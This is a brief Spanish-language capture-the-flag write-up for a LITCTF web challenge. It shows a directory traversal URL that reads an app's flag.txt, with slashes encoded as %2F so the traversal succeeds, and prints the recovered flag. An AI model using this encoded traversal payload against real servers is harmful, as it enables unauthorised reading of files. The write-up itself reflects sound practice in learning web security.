Siguiendo el título del CTF, y haciendo pruebas sobre el URL de la aplicación, encontramos que la flag se encontraba en la siguiente URL:
- http://litctf.org/../../app/flag.txt

Las barras tuvimos que modificarlas a "%2F" para que el directory traversal funcione correctamente, quedando de la siguiente manera:
- http://litctf.org/..%2F..%2Fapp%2Fflag.txt

FLAG: **LITCTF{backtr@ked_230fim0}**